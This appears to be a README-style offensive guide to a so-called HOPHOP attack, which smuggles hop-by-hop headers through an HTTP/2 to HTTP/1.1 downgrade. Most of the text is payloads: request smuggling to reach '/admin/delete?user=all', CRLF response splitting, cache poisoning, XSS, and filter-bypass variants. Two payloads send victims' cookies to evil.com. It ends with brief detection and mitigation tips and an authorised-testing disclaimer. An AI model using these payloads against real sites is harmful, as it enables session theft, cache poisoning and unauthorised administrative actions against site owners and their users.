# HopHopcheck
HopHop

## HOPHOP Attack (HTTP/2 → HTTP/1.1 Protocol Downgrade Attack)

The HOPHOP attack is a sophisticated protocol downgrade vulnerability that exploits the transition between HTTP/2 and HTTP/1.1, specifically targeting Hop-by-Hop headers.

### How It Works

**HTTP/2** doesn't use certain headers (like `Connection`, `Keep-Alive`, etc.), but **HTTP/1.1** does. When a frontend HTTP/2 server downgrades to a backend HTTP/1.1 server, headers can be smuggled.

### Basic Attack Vector

```
# HTTP/2 Request with smuggled headers
:method = POST
:path = /victim
:scheme = https
authority = example.com
connection = keep-alive, x-smuggled
x-smuggled = transfer-encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.com
```

### HOPHOP + CRLF → XSS Combined Attack

```
# HTTP/2 Request with CRLF injection through hop-by-hop headers
:method = GET
:path = /search?q=test
:scheme = https
connection = x-inject
x-inject = %0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('HOPHOP+XSS')</script>

# Alternative with double header smuggling
:method = GET
:path = /
connection = x-http2-smuggle
x-http2-smuggle = x-request: /evil%0d%0ax-script: <script>alert(1)</script>
```

### Real-World Attack Scenarios

#### 1. **Cache Poisoning + XSS**
```
# Poison cache with malicious response
:method = GET
:path = /poison
connection = x-cache-smuggle
x-cache-smuggle = HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

#### 2. **Response Splitting via HOPHOP**
```
# Frontend HTTP/2
:method = GET
:path = /split
connection = x-hop
x-hop = %0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation: javascript:alert('XSS')
```

#### 3. **Header Injection Chain**
```
# Multiple headers smuggled
:method = POST
:path = /api/data
connection = x-chain1, x-chain2
x-chain1 = Set-Cookie: session=evil%0d%0a
x-chain2 = Content-Type: text/html%0d%0a%0d%0a<script>fetch('https://evil.com?c='+btoa(document.cookie))</script>
```

### Advanced Payloads

#### **HTTP/2 to HTTP/1.1 Downgrade with Body Smuggling**
```
:method = POST
:path = /submit
:scheme = https
content-length = 4
connection = x-te
x-te = transfer-encoding: chunked

0

GET /admin/delete?user=all HTTP/1.1
Host: internal-admin
X-Ignore: _
```

#### **CRLF + HOPHOP for XSS in Headers**
```
# Smuggled response headers with XSS
:method = GET
:path = /reflect
connection = x-xsstest
x-xsstest = %0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert('HOPHOP+XSS')</script>
```

### Testing Methodology

1. **Identify Hop-by-Hop Headers**
```
# Test for header reflection
curl -H "Connection: x-test" -H "x-test: %0d%0a<script>alert(1)</script>" https://target.com
```

2. **Check for Protocol Downgrade**
```
# Using curl with HTTP/2
curl --http2 -H "Connection: x-smuggle" -H "x-smuggle: %0d%0aSet-Cookie: malicious=1" https://target.com
```

3. **Fuzzing Combinations**
```
# Common hop-by-hop headers to test
Connection: keep-alive, close, upgrade, x-custom
X-Forwarded-For, X-Forwarded-Host, X-Real-IP
Transfer-Encoding, Content-Length
```

### Protection Bypass Techniques

```
# Case variation
cOnNeCtIoN: x-bypass
X-Bypass: %0d%0a<script>alert('bypass')</script>

# Unicode normalization
connection: x-test%u000d%u000a
x-test: <script>alert('unicode')</script>

# Multiple header splitting
connection: x-one, x-two
x-one: %0d%0aContent-Type:
x-two: text/html%0d%0a%0d%0a<script>alert('split')</script>
```

### Detection Patterns

Look for:
- Headers that shouldn't exist in HTTP/2
- Unexpected `Connection` header values
- Custom headers starting with `x-` that appear in responses
- Response splitting artifacts in cached responses
- Mixed protocol behaviors

### Mitigation Strategies

- Sanitize all headers, especially custom ones
- Disable HTTP/1.1 downgrade if possible
- Implement strict header validation
- Use allowlist for allowed headers
- Regular security testing for protocol confusion

**Note:** This is for educational and authorized testing only. Always obtain proper permissions before testing these techniques on any system.
